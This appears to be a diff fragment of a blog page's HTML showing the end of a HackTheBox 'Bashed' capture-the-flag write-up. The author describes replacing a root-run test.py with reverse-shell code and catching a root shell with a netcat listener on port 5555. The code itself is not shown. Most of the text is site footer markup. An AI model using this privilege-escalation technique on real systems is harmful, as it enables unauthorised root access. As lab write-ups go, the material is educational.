-<p>Looking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:</p>
-<ol>
-<li>Look at the simple or obvious things first.  Don&rsquo;t assume every target is going to require some elaborate, complicated method to exploit.</li>
-<li>Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code></li>
-</ol>
-<p>Did you conquer Bashed using some other method?  Feel free to reach out to me on <a href="https://twitter.com/aj_mcquay">Twitter</a>, I&rsquo;d love to talk about it.</p>
-
-        </div>
-
-        <div class="post-footer" id="post-footer">
-    <div class="post-info">
-        <div class="post-info-line">
-            <div class="post-info-mod">
-                <span>This article is updated with 2020-02-01</span>
-            </div>
-            <div class="post-info-license">
-                
-            </div>
-        </div>
-        <div class="post-info-line">
-            <div class="post-info-md">
-                
-                    
-                        <span><a class="link-to-markdown" href="https://securingthe.net/2018/05/hackthebox-bashed/index.md" target="_blank"></a></span>
-                    
-                
-            </div>
-            <div class="post-info-share">
-                
-                    <span>
-    
-        <a href="//twitter.com/share?url=https%3a%2f%2fsecuringthe.net%2f2018%2f05%2fhackthebox-bashed%2f&amp;text=HackTheBox%20Writeup%3a%20Bashed&amp;via=x41x4a" target="_blank" title="Share on Twitter">
-            <i class="fab fa-twitter fa-fw"></i>
-        </a>
-    
-    
-    
-        <a href="//reddit.com/submit?url=https%3a%2f%2fsecuringthe.net%2f2018%2f05%2fhackthebox-bashed%2f&amp;title=HackTheBox%20Writeup%3a%20Bashed" target="_blank" title="Share on Reddit">
-            <i class="fab fa-reddit fa-fw"></i>
-        </a>
-    
-    
-        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fsecuringthe.net%2f2018%2f05%2fhackthebox-bashed%2f&amp;title=HackTheBox%20Writeup%3a%20Bashed" target="_blank" title="Share on LinkedIn">
-            <i class="fab fa-linkedin fa-fw"></i>
-        </a>
-    
-    
-    
-    
-    
-    
-    
-</span>
-                
-            </div>
-        </div>
-    </div>
-
-    <div class="post-info-more">
-        <section>
-            
-                
-                    <span class="tag">
-                        <a href="https://securingthe.net/tags/linux/"><i class="fas fa-tag fa-fw"></i>Linux</a>
-                    </span>
-                
-                    <span class="tag">
-                        <a href="https://securingthe.net/tags/hackthebox/"><i class="fas fa-tag fa-fw"></i>HackTheBox</a>
-                    </span>
-                
-            
-        </section>
-        <section>
-            <span><a href="javascript:window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="https://securingthe.net/">Home</a></span>
-        </section>
-    </div>
-
-    <div class="post-nav">
-        
-            <a href="https://securingthe.net/2018/03/infosec-is-bigger-than-pentesting/" class="prev" rel="prev" title="InfoSec is Bigger Than Pentesting"><i class="fas fa-angle-left fa-fw"></i>InfoSec is Bigger Than Pentesting</a>
-        
-        
-            <a href="https://securingthe.net/2019/02/starting-my-oscp-journey/" class="next" rel="next" title="Starting my OSCP journey">Starting my OSCP journey<i class="fas fa-angle-right fa-fw"></i></a>
-        
-    </div>
-</div>
-
-        <div class="post-comment">
-            
-            
-
-            
-        </div>
-    </article></div>
-            </main>
-            <footer class="footer">
-    <div class="copyright">
-        <div class="copyright-line">
-            Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a>
-        </div>
-        <div class="copyright-line">
-            <i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2020</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://securingthe.net/">AJ McQuay</a></span><span class="license">&nbsp;|&nbsp;<a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
-    </div>
-</footer>
-
-
-    
-    
-
-
-
-
-    
-    
-
-
-
-
-    
-    
-
-
-
-
-
-    
-    
-
-
-
-    
-    
-
-
-
-    
-    
-
-
-
-
-
-    
-    
-
-
-
-
-
-
-    
-    
-
-
-
-    
-    
-
-
-
-
-
-    
-    
-
-
-
-
-    
-    
-
-
-
-
-    
-    
-
-
-
-    
-    
-
-
-
-
-
-    
-    
-
-
-<script src="/js/lib/jquery/jquery.slim.min.min.js"></script>
-<script src="/js/lib/lazysizes/lazysizes.min.min.js"></script>
-<script src="/js/lib/smooth-scroll/smooth-scroll.polyfills.min.min.js"></script><script>window.scroll = new SmoothScroll('[data-scroll]', {speed: 300, speedAsDuration: true});</script>
-
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    
-
-
-
-
-
-
-<script src="/js/blog.min.js"></script>
-
-
-    
-</div>
-        <a href="#" class="dynamic-to-top" id="dynamic-to-top" data-scroll><span>&nbsp;</span></a>
-    </body>
-</html>
+</code></pre></td></tr></table></div></div><p>Here I moved/renamed the existing <code>test.py</code> and created my own with the reverse shell code. This isn&rsquo;t necessary, you could just add the reverse shell bits to the end of the existing file.</p><p>Again note the &ldquo;my HTB IP address field&rdquo; and port number. I want a second reverse shell that&rsquo;s separate from the one I&rsquo;m currently working in, so I selected a new port (5555).</p><p>I&rsquo;m not exactly sure how or when root executes the <code>test.py</code> script. Given the autonomous nature of these HTB systems I assume it&rsquo;s just a cron job. I start a netcat listener on this new port on my local attacker machine and wait.</p><p>After a few minutes&mldr;</p><p><img src=/content/images/2018/05/94582eeb-e301-49ba-9bf2-64769b24438c.png alt=94582eeb-e301-49ba-9bf2-64769b24438c></p><p><strong>root = owned</strong></p><a class=post-dummy-target id=conclusion></a><h1>Conclusion</h1><p>Looking back Bashed was a pretty simple machine, but there were two primary lessons I learned from it:</p><ol><li>Look at the simple or obvious things first. Don&rsquo;t assume every target is going to require some elaborate, complicated method to exploit.</li><li>Enumerate (a lot) and review the details carefully. It took me way too long to notice the permissions on <code>test.txt</code> and <code>test.py</code></li></ol><p>Did you conquer Bashed using some other method? Feel free to reach out to me on <a href=https://twitter.com/aj_mcquay>Twitter</a>, I&rsquo;d love to talk about it.</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>This article is updated with 2020-02-01</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=https://securingthe.net/2018/05/hackthebox-bashed/index.md target=_blank></a></span></div><div class=post-info-share><span><a href="//twitter.com/share?url=https%3a%2f%2fsecuringthe.net%2f2018%2f05%2fhackthebox-bashed%2f&text=HackTheBox%20Writeup%3a%20Bashed&via=x41x4a" target=_blank title="Share on Twitter"><i class="fab fa-twitter fa-fw"></i></a><a href="//reddit.com/submit?url=https%3a%2f%2fsecuringthe.net%2f2018%2f05%2fhackthebox-bashed%2f&title=HackTheBox%20Writeup%3a%20Bashed" target=_blank title="Share on Reddit"><i class="fab fa-reddit fa-fw"></i></a><a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fsecuringthe.net%2f2018%2f05%2fhackthebox-bashed%2f&title=HackTheBox%20Writeup%3a%20Bashed" target=_blank title="Share on LinkedIn"><i class="fab fa-linkedin fa-fw"></i></a></span></div></div></div><div class=post-info-more><section><span class=tag><a href=https://securingthe.net/tags/linux/><i class="fas fa-tag fa-fw"></i>Linux</a></span>
+<span class=tag><a href=https://securingthe.net/tags/hackthebox/><i class="fas fa-tag fa-fw"></i>HackTheBox</a></span></section><section><span><a href=javascript:window.history.back();>Back</a></span>&nbsp;|&nbsp;<span><a href=https://securingthe.net/>Home</a></span></section></div><div class=post-nav><a href=https://securingthe.net/2018/03/infosec-is-bigger-than-pentesting/ class=prev rel=prev title="InfoSec is Bigger Than Pentesting"><i class="fas fa-angle-left fa-fw"></i>InfoSec is Bigger Than Pentesting</a>
+<a href=https://securingthe.net/2019/02/starting-my-oscp-journey/ class=next rel=next title="Starting my OSCP journey">Starting my OSCP journey<i class="fas fa-angle-right fa-fw"></i></a></div></div><div class=post-comment><div id=disqus_thread></div><script type=text/javascript>(function(){if(window.location.hostname=="localhost")
+return;var dsq=document.createElement("script");dsq.type="text/javascript";dsq.async=true;var disqus_shortname="ajmcquay";dsq.src="//"+disqus_shortname+".disqus.com/embed.js";(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(dsq);})();</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com/ class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></article></div></main><footer class=footer><div class=copyright><div class=copyright-line>Powered by <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreffer">Hugo</a>&nbsp;|&nbsp;Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="external nofollow noopener noreffer">LoveIt<i class="far fa-heart fa-fw"></i></a></div><div class=copyright-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2019 - 2020</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://securingthe.net/>AJ McQuay</a></span><span class=license>&nbsp;|&nbsp;<a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer><script src=/js/lib/jquery/jquery.slim.min.min.js></script><script src=/js/lib/lazysizes/lazysizes.min.min.js></script><script src=/js/lib/smooth-scroll/smooth-scroll.polyfills.min.min.js></script><script>window.scroll=new SmoothScroll('[data-scroll]',{speed:300,speedAsDuration:true});</script><script src=/js/blog.min.js></script></div><a href=# class=dynamic-to-top id=dynamic-to-top data-scroll><span>&nbsp;</span></a></body></html>
